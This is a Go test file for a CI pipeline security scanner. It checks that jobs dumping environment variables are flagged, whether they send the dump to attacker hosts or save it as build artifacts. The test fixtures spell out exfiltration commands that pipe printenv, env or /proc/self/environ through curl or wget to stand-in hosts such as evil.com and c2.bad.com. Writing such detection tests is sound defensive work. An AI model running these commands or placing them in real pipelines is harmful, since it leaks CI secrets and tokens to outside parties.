package analyze

import (
	"testing"

	"github.com/mr-pmillz/gogatoz/pkg/pipeline"
)

func TestSecretExfilHTTP_PrintenvCurl(t *testing.T) {
	doc := &pipeline.Document{
		Jobs: []pipeline.Job{{
			Name:   "exfil",
			Script: []string{"printenv > /tmp/env.txt", `curl -X POST -d @/tmp/env.txt https://evil.com/collect`},
		}},
	}
	findings, err := Run(doc)
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if !hasFindingID(findings, SecretExfilHTTPID) {
		t.Fatalf("expected %s finding, got: %+v", SecretExfilHTTPID, findingIDs(findings))
	}
}

func TestSecretExfilHTTP_PipeToCurl(t *testing.T) {
	doc := &pipeline.Document{
		Jobs: []pipeline.Job{{
			Name:   "format",
			Script: []string{"printenv | curl -X POST -d @- https://attacker.com/recv"},
		}},
	}
	findings, err := Run(doc)
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if !hasFindingID(findings, SecretExfilHTTPID) {
		t.Fatalf("expected %s finding", SecretExfilHTTPID)
	}
}

func TestSecretExfilHTTP_SecretVarInCurl(t *testing.T) {
	doc := &pipeline.Document{
		Jobs: []pipeline.Job{{
			Name:   "deploy",
			Script: []string{`curl -H "Authorization: Bearer $CI_JOB_TOKEN" https://registry.example.com/push`},
		}},
	}
	findings, err := Run(doc)
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if !hasFindingID(findings, SecretExfilHTTPID) {
		t.Fatalf("expected %s finding for secret var in curl", SecretExfilHTTPID)
	}
}

func TestSecretExfilHTTP_WgetPostData(t *testing.T) {
	doc := &pipeline.Document{
		Jobs: []pipeline.Job{{
			Name:   "send",
			Script: []string{"env > /tmp/dump.txt", "wget --post-file /tmp/dump.txt https://c2.example.com/ingest"},
		}},
	}
	findings, err := Run(doc)
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if !hasFindingID(findings, SecretExfilHTTPID) {
		t.Fatalf("expected %s finding", SecretExfilHTTPID)
	}
}

func TestSecretExfilArtifact_EnvDumpToArtifact(t *testing.T) {
	doc := &pipeline.Document{
		Jobs: []pipeline.Job{{
			Name:   "code-format",
			Script: []string{"printenv > format-results.txt"},
			Artifacts: map[string]any{
				"paths": []any{"format-results.txt"},
			},
		}},
	}
	findings, err := Run(doc)
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if !hasFindingID(findings, SecretExfilArtifactID) {
		t.Fatalf("expected %s finding, got: %+v", SecretExfilArtifactID, findingIDs(findings))
	}
}

func TestSecretExfilArtifact_WildcardPath(t *testing.T) {
	doc := &pipeline.Document{
		Jobs: []pipeline.Job{{
			Name:   "diagnostics",
			Script: []string{"env > results/env.txt"},
			Artifacts: map[string]any{
				"paths": []any{"results/*"},
			},
		}},
	}
	findings, err := Run(doc)
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if !hasFindingID(findings, SecretExfilArtifactID) {
		t.Fatalf("expected %s finding for wildcard artifact path", SecretExfilArtifactID)
	}
}

func TestSecretExfil_NoFalsePositive_NormalCurl(t *testing.T) {
	doc := &pipeline.Document{
		Jobs: []pipeline.Job{{
			Name:   "healthcheck",
			Script: []string{"curl -s https://api.example.com/health"},
		}},
	}
	findings, err := Run(doc)
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if hasFindingID(findings, SecretExfilHTTPID) {
		t.Fatalf("did not expect %s finding for benign curl", SecretExfilHTTPID)
	}
	if hasFindingID(findings, SecretExfilArtifactID) {
		t.Fatalf("did not expect %s finding for benign curl", SecretExfilArtifactID)
	}
}

func TestSecretExfil_ProcEnviron(t *testing.T) {
	doc := &pipeline.Document{
		Jobs: []pipeline.Job{{
			Name:   "scan",
			Script: []string{"cat /proc/self/environ | curl -X POST -d @- https://c2.bad.com/recv"},
		}},
	}
	findings, err := Run(doc)
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if !hasFindingID(findings, SecretExfilHTTPID) {
		t.Fatalf("expected %s finding for /proc/self/environ exfil", SecretExfilHTTPID)
	}
}

func TestSecretExfil_BeforeScript(t *testing.T) {
	doc := &pipeline.Document{
		Jobs: []pipeline.Job{{
			Name:         "test",
			BeforeScript: []string{"printenv > /tmp/env_dump.txt"},
			Script:       []string{"echo 'running tests'"},
			Artifacts: map[string]any{
				"paths": []any{"/tmp/env_dump.txt"},
			},
		}},
	}
	findings, err := Run(doc)
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if !hasFindingID(findings, SecretExfilArtifactID) {
		t.Fatalf("expected %s finding from before_script env dump", SecretExfilArtifactID)
	}
}

func findingIDs(findings []Finding) []string {
	ids := make([]string, len(findings))
	for i, f := range findings {
		ids[i] = f.ID
	}
	return ids
}
